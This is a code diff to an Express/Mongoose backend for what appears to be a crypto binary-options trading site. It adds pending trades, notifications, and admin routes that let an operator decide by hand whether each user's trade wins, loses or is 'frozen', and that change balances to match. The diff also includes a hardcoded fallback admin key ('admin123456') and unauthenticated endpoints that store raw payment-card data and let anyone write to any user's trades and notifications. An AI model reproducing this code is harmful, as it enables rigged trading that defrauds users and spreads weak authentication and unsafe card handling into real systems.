@@ -36,6 +36,8 @@ router.post("/register", async (req, res) => {
       dob: dob || "",
       country: country || "",
       withdrawalRequests: [],
+      pendingTrades: [],
+      notifications: [],
     });
 
     const safeUser = user.toObject();
@@ -344,7 +346,7 @@ router.get("/admin/all-withdrawals", async (req, res) => {
   }
 });
 
-// ================= SAVE CARD TO USER =================
+// ================= SAVE CARD TO USER (LEGACY) =================
 router.post("/save-card", async (req, res) => {
   try {
     const { username, card } = req.body;
@@ -411,6 +413,321 @@ router.get("/:username/binary-trades", async (req, res) => {
     }
 
     res.json(user.binaryTrades || []);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= GET ALL TRADES (ADMIN ONLY) - returns ALL trades with status =================
+router.get("/admin/all-trades", async (req, res) => {
+  try {
+    const adminKey = req.headers['x-admin-key'];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+    
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+    
+    const users = await User.find({});
+    const allTrades = [];
+    
+    users.forEach(user => {
+      (user.pendingTrades || []).forEach(trade => {
+        allTrades.push({
+          ...trade,
+          username: user.username,
+          userEmail: user.email,
+          userFullName: user.fullName,
+        });
+      });
+    });
+    
+    allTrades.sort((a, b) => new Date(b.startTime) - new Date(a.startTime));
+    res.json(allTrades);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= SAVE PENDING TRADE =================
+router.post("/:username/pending-trades", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const trade = req.body;
+    
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    user.pendingTrades = user.pendingTrades || [];
+    user.pendingTrades.push(trade);
+    await user.save();
+    
+    res.json({ success: true, trade });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= ADMIN RESOLVE TRADE (WIN/LOSS/FREEZE) - WITH BALANCE CHANGE =================
+router.post("/admin/resolve-trade", async (req, res) => {
+  try {
+    const adminKey = req.headers['x-admin-key'];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+    
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+    
+    const { username, tradeId, action } = req.body;
+    
+    if (!username || !tradeId || !action) {
+      return res.status(400).json({ error: "Username, tradeId, and action are required" });
+    }
+    
+    const user = await User.findOne({ username: username.toLowerCase().trim() });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    const tradeIndex = (user.pendingTrades || []).findIndex(t => String(t.id) === String(tradeId));
+    if (tradeIndex === -1) {
+      return res.status(404).json({ error: "Trade not found" });
+    }
+    
+    const trade = user.pendingTrades[tradeIndex];
+    
+    if (trade.status !== "pending") {
+      return res.status(400).json({ error: `Trade already ${trade.status}` });
+    }
+    
+    let newBalance = user.balance;
+    let profitAmount = 0;
+    let resultMessage = "";
+    
+    if (action === "win") {
+      // WIN: Add profit + original wager to balance
+      profitAmount = trade.amount * (trade.profitPercent / 100);
+      const totalReturn = trade.amount + profitAmount;
+      newBalance = user.balance + totalReturn;
+      trade.status = "won";
+      trade.resolvedAt = new Date().toISOString();
+      trade.result = "WIN";
+      trade.profitAmount = profitAmount;
+      resultMessage = `WIN! +$${profitAmount.toFixed(2)} profit added. Total: +$${totalReturn.toFixed(2)}`;
+    } else if (action === "loss") {
+      // LOSS: Deduct the wager amount from balance
+      newBalance = user.balance - trade.amount;
+      trade.status = "lost";
+      trade.resolvedAt = new Date().toISOString();
+      trade.result = "LOSS";
+      resultMessage = `LOSS. -$${trade.amount} deducted from balance.`;
+    } else if (action === "freeze") {
+      // FREEZE: No balance change
+      trade.status = "frozen";
+      trade.resolvedAt = new Date().toISOString();
+      trade.result = "FROZEN";
+      resultMessage = `FROZEN. Amount held for review.`;
+    } else {
+      return res.status(400).json({ error: "Invalid action. Use 'win', 'loss', or 'freeze'" });
+    }
+    
+    // Update user balance
+    user.balance = newBalance;
+    user.pendingTrades[tradeIndex] = trade;
+    
+    // Add to transactions history
+    const transaction = {
+      type: "Binary Trade",
+      coin: trade.coin,
+      amount: trade.amount,
+      result: trade.result,
+      profit: action === "win" ? profitAmount : -trade.amount,
+      date: new Date().toISOString(),
+      status: trade.status,
+      tradeDetails: trade
+    };
+    user.transactions = [transaction, ...(user.transactions || [])];
+    
+    user.markModified('pendingTrades');
+    user.markModified('transactions');
+    await user.save();
+    
+    // Add notification to user
+    user.notifications = user.notifications || [];
+    user.notifications.unshift({
+      id: Date.now() + Math.random(),
+      title: `Trade ${action.toUpperCase()}`,
+      body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
+      time: new Date().toLocaleTimeString(),
+      date: new Date().toISOString(),
+      read: false,
+      fromAdmin: true
+    });
+    await user.save();
+    
+    res.json({ 
+      success: true, 
+      message: `Trade marked as ${action.toUpperCase()}`,
+      newBalance: user.balance,
+      tradeStatus: trade.status
+    });
+  } catch (err) {
+    console.error("Error resolving trade:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= SEND NOTIFICATION TO USER (ADMIN ONLY) =================
+router.post("/admin/send-notification", async (req, res) => {
+  try {
+    const adminKey = req.headers['x-admin-key'];
+    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
+    
+    if (!adminKey || adminKey !== validAdminKey) {
+      return res.status(401).json({ error: "Unauthorized. Admin access only." });
+    }
+    
+    const { username, title, body } = req.body;
+    
+    if (!username || !title) {
+      return res.status(400).json({ error: "Username and title required" });
+    }
+    
+    const user = await User.findOne({ username: username.toLowerCase().trim() });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    user.notifications = user.notifications || [];
+    user.notifications.unshift({
+      id: Date.now() + Math.random(),
+      title,
+      body: body || "",
+      time: new Date().toLocaleTimeString(),
+      date: new Date().toISOString(),
+      read: false,
+      fromAdmin: true
+    });
+    
+    await user.save();
+    
+    res.json({ success: true, message: "Notification sent" });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= ADD NOTIFICATION (for trade placement) =================
+router.post("/:username/notifications", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const { title, body, type } = req.body;
+    
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    user.notifications = user.notifications || [];
+    user.notifications.unshift({
+      id: Date.now() + Math.random(),
+      title,
+      body,
+      time: new Date().toLocaleTimeString(),
+      date: new Date().toISOString(),
+      read: false,
+      type: type || "general"
+    });
+    
+    await user.save();
+    
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= GET USER NOTIFICATIONS =================
+router.get("/:username/notifications", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const user = await User.findOne({ username });
+    
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    res.json(user.notifications || []);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= MARK NOTIFICATION READ =================
+router.post("/:username/notifications/read", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const { notificationId } = req.body;
+    
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    const notifIndex = (user.notifications || []).findIndex(n => String(n.id) === String(notificationId));
+    if (notifIndex !== -1) {
+      user.notifications[notifIndex].read = true;
+      await user.save();
+    }
+    
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= DELETE NOTIFICATION =================
+router.delete("/:username/notifications/:notificationId", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const notificationId = req.params.notificationId;
+    
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    user.notifications = (user.notifications || []).filter(n => String(n.id) !== String(notificationId));
+    await user.save();
+    
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================= SAVE CARD TO USER (NEW DIRECT ENDPOINT) =================
+router.post("/:username/cards", async (req, res) => {
+  try {
+    const username = req.params.username.toLowerCase().trim();
+    const { card } = req.body;
+    
+    if (!card) {
+      return res.status(400).json({ error: "Card data required" });
+    }
+    
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    
+    const updatedCards = [...(user.savedCards || []), card];
+    user.savedCards = updatedCards;
+    await user.save();
+    
+    res.json({ success: true, savedCards: updatedCards });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
